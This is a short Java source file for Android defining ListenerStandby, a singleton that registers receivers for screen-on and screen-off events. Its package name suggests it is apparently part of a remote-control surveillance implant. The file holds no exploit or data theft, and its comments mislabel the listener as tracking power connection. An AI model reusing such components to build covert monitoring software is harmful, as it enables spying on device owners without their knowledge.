package com.ht.RCSAndroidGUI.listener;

import android.content.Intent;
import android.content.IntentFilter;

import com.ht.RCSAndroidGUI.Standby;
import com.ht.RCSAndroidGUI.Status;

public class ListenerStandby extends Listener<Standby> {
		/** The Constant TAG. */
		private static final String TAG = "StandbyListener";

		private BroadcastMonitorStandby standbyReceiver;

		/** The singleton. */
		private volatile static ListenerStandby singleton;

		/**
		 * Self.
		 * 
		 * @return the status
		 */
		public static ListenerStandby self() {
			if (singleton == null) {
				synchronized (ListenerStandby.class) {
					if (singleton == null) {
						singleton = new ListenerStandby();
					}
				}
			}

			return singleton;
		}
		
		@Override
		protected void start() {
			registerAc();
		}

		@Override
		protected void stop() {
			Status.getAppContext().unregisterReceiver(standbyReceiver);
		}
		
		/**
		 * Register Power Connected/Disconnected.
		 */
		private void registerAc() {
			standbyReceiver = new BroadcastMonitorStandby();
			
			final IntentFilter filterOn = new IntentFilter(Intent.ACTION_SCREEN_ON);
			final IntentFilter filterOff = new IntentFilter(Intent.ACTION_SCREEN_OFF);
			
			// Register the broadcastreceiver and filter it to only get power status changes
			Status.getAppContext().registerReceiver(standbyReceiver, filterOn);
			Status.getAppContext().registerReceiver(standbyReceiver, filterOff);
		}
}
